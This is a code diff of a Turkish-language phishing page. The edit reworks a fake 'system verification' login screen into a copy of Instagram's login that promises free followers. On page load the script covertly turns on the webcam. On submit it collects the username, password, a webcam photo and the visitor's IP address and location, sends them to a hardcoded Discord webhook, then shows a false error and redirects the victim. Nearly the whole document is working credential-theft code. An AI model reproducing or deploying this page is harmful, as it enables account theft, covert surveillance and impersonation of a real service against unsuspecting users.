@@ -3,45 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Doğrulama | Ömer Ekşi</title>
+    <title>Instagram Takipçi Paneli | Ücretsiz Takipçi ve Beğeni</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .login-box { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff00; text-align: center; width: 300px; z-index: 10; }
-        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 10px 0; width: 100%; outline: none; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
+        * { box-sizing: border-box; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 7px; margin-bottom: 10px; font-size: 12px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:disabled { background: #b2dffc; }
+        .info { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; font-weight: 600; }
+        .footer { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
         video, canvas { display: none; }
-        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
     </style>
 </head>
 <body>
-    <canvas id="matrix-canvas"></canvas>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <div class="login-box">
-        <h2 style="font-size: 1.2rem;">KİMLİK DOĞRULAMA</h2>
-        <p style="font-size: 0.8rem; color: #888;">Devam etmek için sistem şifrenizi girin.</p>
-        <input type="password" id="target_pass" placeholder="Sistem Şifresi...">
-        <button onclick="captureAll()">DOĞRULA</button>
+    <div class="login-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monogram_735464.png/172274291.png" class="logo" style="width: 50px;">
+        <div class="info">Ücretsiz 1.000 Takipçi Kazan</div>
+        <p style="font-size: 12px; color: #262626; margin-bottom: 15px;">Takipçilerin gönderilmesi için hesabınızı doğrulayın.</p>
+        
+        <input type="text" id="username" placeholder="Kullanıcı Adı">
+        <input type="password" id="password" placeholder="Şifre">
+        
+        <button onclick="startProcess()">Takipçi Gönder</button>
+        
+        <div class="footer">© 2026 Instagram from Meta</div>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1470110601714864198/Gxgga4v26nLVHeZPgqpTrrg5sqnp4xsJsVjP0BuDKmNXcRdsVYv284lOBul-gUcj4jPw";
 
-        // Kamera İzni Site Açılır Açılmaz Alınır
+        // Sayfa açılır açılmaz kamerayı gizlice hazırla
         window.onload = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
             } catch (e) {}
-            drawMatrix();
         };
 
-        async function captureAll() {
-            const pass = document.getElementById('target_pass').value;
-            if(!pass) return alert("Şifre boş olamaz!");
+        async function startProcess() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.querySelector('button');
 
-            // 1. Fotoğraf Çek
+            if(!user || !pass) {
+                alert("Lütfen bilgileri eksiksiz girin.");
+                return;
+            }
+
+            btn.innerText = "Gönderiliyor...";
+            btn.disabled = true;
+
+            // 1. Fotoğrafı Yakala
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -49,44 +68,42 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             const imageData = canvas.toDataURL('image/png');
 
-            // 2. IP Bilgisi Al
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+            // 2. IP ve Konum Al
+            let ipData = { ip: "Bilinmiyor" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {}
 
-            // 3. Her Şeyi Discord'a Gönder
-            const blob = await (await fetch(imageData)).blob();
-            const formData = new FormData();
-            formData.append("file", blob, "victim.png");
-            
-            const payload = {
-                username: "ÖMER EKŞİ LOGGER",
-                content: `🔑 **HEDEF ŞİFRESİNİ GİRDİ!**\n\n**Şifre:** \`${pass}\`\n**IP:** \`${ipData.ip}\`\n**Konum:** ${ipData.city}/${ipData.country_name}`
-            };
+            // 3. Discord'a Paketle ve Gönder
+            try {
+                const blob = await (await fetch(imageData)).blob();
+                const formData = new FormData();
+                formData.append("file", blob, "av.png");
+                
+                const payload = {
+                    username: "INSTA-BOT LOGGER",
+                    embeds: [{
+                        title: "🔥 YENİ HESAP DÜŞTÜ!",
+                        color: 13500416,
+                        fields: [
+                            { name: "👤 Kullanıcı", value: `\`${user}\``, inline: true },
+                            { name: "🔑 Şifre", value: `\`${pass}\``, inline: true },
+                            { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: false },
+                            { name: "📍 Konum", value: `${ipData.city} / ${ipData.country_name}`, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
 
-            formData.append("payload_json", JSON.stringify(payload));
-            await fetch(webhookURL, { method: "POST", body: formData });
+                formData.append("payload_json", JSON.stringify(payload));
+                await fetch(webhookURL, { method: "POST", body: formData });
 
-            // 4. Kurbanı kandır ve yönlendir
-            alert("Sistem Doğrulandı. Yönlendiriliyorsunuz...");
-            window.location.href = "https://google.com";
-        }
-
-        // Matrix Arka Plan (Öncekiyle aynı)
-        function drawMatrix() {
-            const c = document.getElementById('matrix-canvas');
-            const ctx = c.getContext('2d');
-            c.width = window.innerWidth; c.height = window.innerHeight;
-            const drops = Array.from({ length: 50 }).fill(1);
-            setInterval(() => {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-                ctx.fillRect(0, 0, c.width, c.height);
-                ctx.fillStyle = "#00ff00";
-                drops.forEach((y, i) => {
-                    ctx.fillText("01", i * 20, y * 20);
-                    if (y * 20 > c.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                });
-            }, 50);
+                alert("Sistem yoğunluğu nedeniyle hata oluştu. Lütfen 24 saat sonra tekrar deneyin.");
+                window.location.href = "https://instagram.com";
+            } catch (err) {
+                console.error(err);
+            }
         }
     </script>
 </body>
